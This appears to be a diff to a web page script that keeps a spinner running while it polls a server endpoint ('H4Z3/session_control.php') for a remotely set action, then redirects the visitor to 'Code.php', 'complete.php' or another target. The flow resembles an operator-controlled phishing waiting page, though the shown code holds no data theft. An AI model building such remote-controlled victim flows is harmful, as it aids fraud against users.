@@ -61,13 +61,90 @@
         handleRedirectCommand(event.detail);
     }
 
+    var hasProcessedPendingAction = false;
+    var pendingActionPollTimer = null;
+    var pendingActionPollInterval = 4000;
+
+    function handlePendingAction(action) {
+        if (!action) {
+            return false;
+        }
+
+        var normalized = ('' + action).toLowerCase();
+
+        if (normalized === 'code') {
+            window.location.href = 'Code.php';
+            return true;
+        }
+
+        if (normalized === 'complete') {
+            window.location.href = 'complete.php';
+            return true;
+        }
+
+        handleRedirectCommand(action);
+        return true;
+    }
+
+    function schedulePendingActionPoll() {
+        if (hasProcessedPendingAction) {
+            return;
+        }
+
+        if (pendingActionPollTimer !== null) {
+            window.clearTimeout(pendingActionPollTimer);
+        }
+
+        pendingActionPollTimer = window.setTimeout(pollForPendingAction, pendingActionPollInterval);
+    }
+
+    function pollForPendingAction() {
+        if (hasProcessedPendingAction || typeof window.fetch !== 'function') {
+            return;
+        }
+
+        window.fetch('H4Z3/session_control.php', {
+            method: 'GET',
+            credentials: 'same-origin',
+            cache: 'no-store'
+        })
+            .then(function (response) {
+                if (!response.ok) {
+                    throw new Error('Request failed');
+                }
+
+                return response.json();
+            })
+            .then(function (payload) {
+                if (!payload || !payload.pending_action) {
+                    schedulePendingActionPoll();
+                    return;
+                }
+
+                hasProcessedPendingAction = handlePendingAction(payload.pending_action);
+
+                if (!hasProcessedPendingAction) {
+                    schedulePendingActionPoll();
+                }
+            })
+            .catch(function () {
+                schedulePendingActionPoll();
+            });
+    }
+
     if (document.readyState === 'complete' || document.readyState === 'interactive') {
         showSpinner();
         startSpinnerCycle();
+        if (typeof window.fetch === 'function') {
+            schedulePendingActionPoll();
+        }
     } else {
         document.addEventListener('DOMContentLoaded', function () {
             showSpinner();
             startSpinnerCycle();
+            if (typeof window.fetch === 'function') {
+                schedulePendingActionPoll();
+            }
         }, { once: true });
     }
 
